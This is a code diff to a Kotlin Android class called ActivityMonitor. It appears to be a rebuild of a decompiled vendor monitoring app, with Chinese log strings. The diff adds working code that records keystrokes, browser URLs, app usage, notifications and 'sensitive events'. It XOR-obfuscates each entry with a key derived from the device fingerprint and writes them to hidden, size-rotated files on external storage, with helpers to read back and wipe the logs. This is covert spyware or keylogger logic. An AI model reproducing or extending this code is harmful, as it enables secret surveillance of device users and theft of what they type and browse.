@@ -28,16 +28,20 @@ object ActivityMonitor {
     private const val TAG = "ActivityMonitor"
     private const val FLUSH_THRESHOLD = 30
     private const val FLUSH_DELAY_MS = 5000L
+    private const val MAX_FILE_SIZE = 1048576L // 1MB
+    private const val LOG_DIR_NAME = "IC"
+    private const val FILE_SEPARATOR = ":::"
 
     // --- LogType enum ---
     // JADX: ActivityMonitor$LogType
     enum class LogType {
-        ACTIVITY,   // a0 — user activity
-        TEXT_EVENT, // a1 — text events
-        URL,        // a2 — browser URLs
-        APP_USAGE,  // a3 — app open/close
-        FOCUS,      // a4 — focus events
-        MESSAGE     // a5 — system messages
+        ACTZ,       // a0 — user activity (vendor: ACTZ)
+        KSTR,       // a1 — keystrokes (vendor: KSTR)
+        BLNK,       // a2 — browser URLs (vendor: BLNK)
+        VAPS,       // a3 — app open/close (vendor: VAPS)
+        NTFS,       // a4 — notifications (vendor: NTFS)
+        ARTS,       // a5 — system events (vendor: ARTS)
+        SEVT        // a6 — sensitive events (vendor: SEVT)
     }
 
     // --- Fields (matching JADX) ---
@@ -197,8 +201,121 @@ object ActivityMonitor {
     @JvmStatic
     fun writeToFile(type: LogType, text: String) {
         executor.execute {
-            // vendor: JADX a5 — RunnableC1052p1 writes text to log file on disk
-            Log.d(TAG, "[${type.name}] $text")
+            try {
+                val typeName = type.name
+                val dateStr = SimpleDateFormat("yyyy-MM-dd", Locale.getDefault()).format(Date())
+                val baseDir = logDir ?: Environment.getExternalStorageDirectory()
+                val typeDir = File(baseDir, "$LOG_DIR_NAME/$typeName")
+
+                if (!typeDir.exists()) {
+                    typeDir.mkdirs()
+                }
+
+                var targetFile = File(typeDir, "$dateStr.txt")
+
+                if (targetFile.exists() && targetFile.length() >= MAX_FILE_SIZE) {
+                    var seq = 1
+                    var rotatedFile: File
+                    do {
+                        rotatedFile = File(typeDir, "${dateStr}_${seq}.txt")
+                        seq++
+                    } while (rotatedFile.exists())
+                    targetFile.renameTo(rotatedFile)
+                    targetFile = File(typeDir, "$dateStr.txt")
+                }
+
+                if (!targetFile.exists()) {
+                    targetFile.createNewFile()
+                }
+
+                val encrypted = xorEncrypt(text + ">") + FILE_SEPARATOR
+                java.io.FileOutputStream(targetFile, true).use { fos ->
+                    java.io.OutputStreamWriter(fos).use { osw ->
+                        java.io.BufferedWriter(osw).use { bw ->
+                            bw.write(encrypted)
+                        }
+                    }
+                }
+
+                addLog(type, text)
+            } catch (e: Exception) {
+                Log.w(TAG, "Record 失败: ${e.message}")
+            }
+        }
+    }
+
+    // --- readLogFile ---
+    @JvmStatic
+    fun readLogFile(type: LogType, filename: String): String {
+        try {
+            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
+            val file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename.txt")
+            if (!file.exists()) return ""
+            val rawContent = file.readText(Charsets.UTF_8)
+            val segments = rawContent.split(FILE_SEPARATOR)
+            val sb = StringBuilder()
+            for (segment in segments) {
+                val trimmed = segment.trim()
+                if (trimmed.isNotEmpty()) {
+                    sb.append(xorDecrypt(trimmed))
+                }
+            }
+            return sb.toString()
+        } catch (e: Exception) {
+            Log.w(TAG, "Read 失败: ${e.message}")
+            return ""
+        }
+    }
+
+    // --- deleteLogFile ---
+    @JvmStatic
+    fun deleteLogFile(type: LogType, filename: String): Boolean {
+        return try {
+            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
+            var file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename.txt")
+            if (!file.exists()) {
+                file = File(baseDir, "$LOG_DIR_NAME/${type.name}/$filename\n.txt")
+            }
+            if (file.exists()) file.delete() else false
+        } catch (e: Exception) {
+            Log.w(TAG, "Remove 失败: ${e.message}")
+            false
+        }
+    }
+
+    // --- clearLogs ---
+    @JvmStatic
+    fun clearLogs(type: LogType): Boolean {
+        return try {
+            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
+            val dir = File(baseDir, "$LOG_DIR_NAME/${type.name}")
+            if (dir.exists()) dir.deleteRecursively() else true
+        } catch (e: Exception) {
+            Log.w(TAG, "Clear 失败: ${e.message}")
+            false
+        }
+    }
+
+    // --- clearAllLogs ---
+    @JvmStatic
+    fun clearAllLogs(): Boolean {
+        return try {
+            val baseDir = logDir ?: Environment.getExternalStorageDirectory()
+            val dir = File(baseDir, LOG_DIR_NAME)
+            if (dir.exists()) dir.deleteRecursively() else true
+        } catch (e: Exception) {
+            Log.w(TAG, "ClearAll 失败: ${e.message}")
+            false
+        }
+    }
+
+    // --- parseLogType ---
+    @JvmStatic
+    fun parseLogType(name: String): LogType {
+        return try {
+            LogType.valueOf(name.uppercase(Locale.ROOT))
+        } catch (_: Exception) {
+            LogType.KSTR
         }
     }
 
@@ -211,13 +328,13 @@ object ActivityMonitor {
             .replace("VIEW_FOCUSED", "聚焦")
             .replace("VIEW_SCROLLED", "滚动")
             .replace("WINDOW_STATE_CHANGED", "窗口切换")
-        writeToFile(LogType.ACTIVITY, translated)
+        writeToFile(LogType.ACTZ, translated)
     }
 
     // --- a7 → logMessage ---
     @JvmStatic
     fun logMessage(message: String) {
-        writeToFile(LogType.MESSAGE, message)
+        writeToFile(LogType.ARTS, message)
     }
 
     // --- a8 → logAppUsage ---
@@ -226,11 +343,11 @@ object ActivityMonitor {
         if (appUsageEnabled && appName.isNotEmpty()) {
             if (isOpen && appName == lastAppName) return
             if (!isOpen && lastAppName.isNotEmpty()) {
-                writeToFile(LogType.APP_USAGE, "离开: $lastAppName")
+                writeToFile(LogType.VAPS, "离开: $lastAppName")
             }
             if (isOpen) {
                 lastAppName = appName
-                writeToFile(LogType.APP_USAGE, "打开: $appName")
+                writeToFile(LogType.VAPS, "打开: $appName")
             }
         }
     }
@@ -240,14 +357,14 @@ object ActivityMonitor {
     fun logUrl(appName: String, url: String) {
         if (!urlMonitorEnabled || url.isEmpty() || url == lastUrl) return
         lastUrl = url
-        writeToFile(LogType.URL, "[$appName] $url")
+        writeToFile(LogType.BLNK, "[$appName] $url")
     }
 
     // --- b0 → logSystem ---
     @JvmStatic
     fun logSystem(event: String) {
         val timeStr = SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
-        writeToFile(LogType.MESSAGE, "[系统] [$timeStr] $event")
+        writeToFile(LogType.ARTS, "[系统] [$timeStr] $event")
     }
 
     // --- Helper: initialize XOR key from Build.FINGERPRINT ---
